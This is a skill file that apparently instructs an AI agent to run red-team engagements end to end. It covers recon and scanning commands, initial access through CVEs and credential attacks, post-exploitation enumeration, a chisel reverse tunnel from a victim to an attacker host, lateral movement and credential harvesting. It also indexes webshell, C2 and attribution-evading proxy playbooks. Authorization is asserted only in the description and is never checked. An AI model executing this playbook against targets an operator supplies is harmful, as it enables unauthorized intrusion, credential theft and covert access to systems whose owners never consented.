---
name: redteam
description: "Red-team engagement playbook router for authorized exercises: external recon, asset correlation, fingerprinting, vulnerability discovery, initial access, tunnel and lateral movement, and evidence handling. Use when the operator hands over a target, a domain, a CIDR, an asset list or a captured host and expects a driven engagement rather than a lecture — recon pipeline, fscan/gogo intranet sweeps, nuclei/ffuf scanning, unauth exploits, webshell and tunnel setup, credential attacks, SQLite asset ledger."
license: MIT
compatibility: "Commands assume the operator's toolkit on PATH or under $DSH_HOME/redteam/toolkit. Nothing here installs or downloads; missing tools are reported as missing."
metadata:
  version: "1.0"
  upstream: "playbook index derived from dsh-purge-community skills/redteam (MIT)"
---

# Red-team engagement router

Goal: turn a target into an **evidence-backed asset ledger plus the access it
yields**, and stop guessing. Every phase writes a row before the next phase
starts, because the ledger is what the report is made of.

## 0. Scope the engagement in one line, then move

Write the line into `$DSH_HOME/redteam/engagements/<name>/SCOPE.md`:

```
TARGET      = <domain | CIDR | company name>
WINDOW      = <start> .. <end>
ENTRY       = <external only | assume-breach host>
DELIVERABLE = <ledger + findings + replay commands>
```

Then run the phases in order. Skipping a phase is a decision, so record it.

## 1. Recon → asset ledger

External, domain in hand:

```bash
subfinder -d DOMAIN -all -silent | dnsx -silent -a -resp | tee subs.txt
naabu -list subs.txt -top-ports 1000 -silent | httpx -silent -sc -title -td | tee alive.txt
```

No ProjectDiscovery stack: `fscan -h CIDR -p 1-65535 -np -nobr` or
`nmap -sV -Pn -p- --min-rate 2000 TARGET` gives the same ledger rows.

Write each row to SQLite as you go — `assets(host,port,proto,title,tech,source,seen_at)`.
A finding without an asset row is not a finding.

## 2. Fingerprint and pick the entry

```bash
whatweb -a 3 http://TARGET
nuclei -l alive.txt -severity critical,high -tags cve,exposure,misconfig -o nuclei.txt
ffuf -u http://TARGET/FUZZ -w WORDLIST -mc 200,204,301,302,403 -t THREADS
```

Fingerprint first, exploit second: the CVE list is chosen by the product and
version, not by the scanner's enthusiasm. Record `tech` on the asset row.

## 3. Initial access

| Surface | Playbook |
| --- | --- |
| Exposed service with a known CVE | `unauth-exploit` |
| Login form / SSH / DB | `credential-attack` |
| Upload, deserialization, SQLi, SSRF | `web-exploit` (see the `skill` for SRC/whitebox work) |
| Leaked config, `.git`, env files | `unauth-exploit` § secrets |

Get a shell, then immediately: `id; hostname; ip a; cat /etc/hosts` → new asset row,
`foothold` column. A shell you cannot re-enter is not access; install a stable
channel before exploring.

## 4. Tunnel and pivot

```bash
# SOCKS5 through the foothold
chisel server -p 8080 --reverse            # attacker
chisel client ATTACKER:8080 R:socks        # victim
# or frp / suo5 when only HTTP egress exists
```

Then re-run phase 1 against the internal range **through the proxy**, never
straight from the attacker host: `proxychains4 fscan -h 10.0.0.0/24 -np`.

## 5. Lateral movement

`fscan`/`gogo` for the sweep, then per-protocol: SMB (`nxc smb`), WinRM,
SSH keys found on disk, database trust, CI tokens. Collect credentials into the
ledger (`creds(user,secret_kind,source_host,validated)`), and validate each one
once — an unvalidated credential is a rumour.

## 6. Evidence and replay

Per finding, keep: request/response pair, the exact command, the timestamp, the
asset row id. Anything you cannot replay is not evidence. Close the engagement
by exporting the ledger plus a replay script per finding.

## Playbook index

The full playbooks ship separately (dsh-purge `skills/redteam`); when installed
they are loaded by name. Copy them into the library with:

```bash
point skills install            # $DSH_HOME/redteam/skills
```

| Playbook | Use |
| --- | --- |
| `passive-recon` / `active-scan` | OSINT surface, then live probing |
| `recon-pipeline` | subfinder → dnsx → naabu → httpx → katana |
| `fofa-recon` | FOFA/Hunter queries when the target's own DNS is thin |
| `asset-correlation` | merge IP/domain/cert/ICP into one organisation |
| `web-fingerprint` | product/version identification before exploit choice |
| `dir-bruteforce` | content discovery, 403/401 handling |
| `nuclei-scan` | template selection and triage |
| `unauth-exploit` | unauthenticated RCE/read primitives |
| `credential-attack` | hydra online, hashcat/john offline |
| `fscan-intranet` / `gogo-intranet` | internal sweeps |
| `lateral-movement` | SMB/WinRM/SSH/DB pivots |
| `shell-handler` / `webshell-toolkit` | listener and webshell management |
| `chisel-tunnel` / `frp-tunnel` / `suo5-tunnel` | egress channels by protocol |
| `vps-reverse-shell` | C2 host setup and callback hygiene |
| `cn-proxy-pool` | proxy pool for scanning without burning the source |
| `browser-automation` / `kimi-webbridge` | authenticated browsing, session-bound actions |
| `redteam-setup` | toolkit bootstrap |

## Failure catalogue

- **Scanner says vulnerable, exploit does nothing** → version banner is a lie; check the actual build via an error page or a static asset hash.
- **Tunnel dies under load** → egress is HTTP-only; switch to `suo5` or `frp` over 443.
- **Credentials work from one host and not another** → source-IP allowlist; pivot through the host that works.
- **Sweep is fast but empty** → ICMP/ARP filtered; sweep with `-np` and TCP-only, and confirm the route through the proxy.
